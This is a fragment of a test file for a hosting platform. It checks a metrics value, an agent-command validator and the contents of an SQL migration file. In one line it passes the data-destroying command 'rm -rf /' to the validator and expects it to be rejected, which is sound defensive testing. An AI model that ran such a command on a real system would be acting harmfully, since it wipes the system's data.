    expect(docJson.metricsSummary.ramUsedMB).toBe(0);

    // Verify validateTypedAgentCommand export directly
    expect(() => validateTypedAgentCommand('rm -rf /')).toThrow();
    expect(validateTypedAgentCommand('php artisan cache:clear').binary).toBe('php');

    // Verify Phase 7 SQL migration structure
    const migrationSql = readFileSync(
      join(process.cwd(), 'supabase', 'migrations', 'phase7_compute_hardening_and_telemetry.sql'),
      'utf8'
    );
    expect(migrationSql).toContain('provisioning_failed');
    expect(migrationSql).toContain('CREATE TABLE IF NOT EXISTS public.platform_service_telemetry');
    expect(migrationSql).toContain('ALTER COLUMN ssl_days_remaining SET DEFAULT NULL');
    expect(migrationSql).toContain("to_regclass('public.hosting_services')");
  });
});
